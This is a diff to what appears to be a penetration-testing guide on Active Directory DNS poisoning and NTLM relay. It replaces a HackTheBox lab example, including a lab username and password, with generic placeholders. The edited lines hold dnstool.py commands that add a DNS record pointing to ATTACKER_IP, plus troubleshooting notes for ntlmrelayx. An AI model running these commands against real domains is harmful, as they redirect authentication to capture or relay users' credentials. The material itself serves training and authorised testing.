@@ -341,10 +341,10 @@ most common failure mode for this technique.
 python3 dnstool.py -u 'DOMAIN.LOCAL\user' -p 'password' DC_IP \
   -a add -r 'RECORDNAME.DOMAIN.LOCAL' -d ATTACKER_IP -t A
 
-# Example: script resolves web*.intelligence.htb
-python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' \
-  -p 'NewIntelligenceCorpUser9876' 10.129.1.166 \
-  -a add -r 'webpwned.intelligence.htb' -d 10.10.14.67 -t A
+# Example: script resolves web*.corp.local
+python3 dnstool.py -u 'corp.local\svc_web' \
+  -p 'Password123' 10.10.10.1 \
+  -a add -r 'target.corp.local' -d ATTACKER_IP -t A
 ```
 
 If `dnstool.py` is not in `$PATH`, clone krbrelayx:
@@ -782,7 +782,7 @@ or will not connect outbound to your listener.
 **Common causes (all on the target side — not your attackbox):**
 - Windows Firewall on target blocks outbound SMB to non-DC addresses
 - Network segmentation / firewall between target and attacker
-- HTB/lab environments often restrict outbound SMB
+- Lab environments often restrict outbound SMB
 - Target's SMB client prefers Kerberos and won't fall back to NTLM
 
 **Do NOT debug your own network stack.** If ntlmrelayx is listening
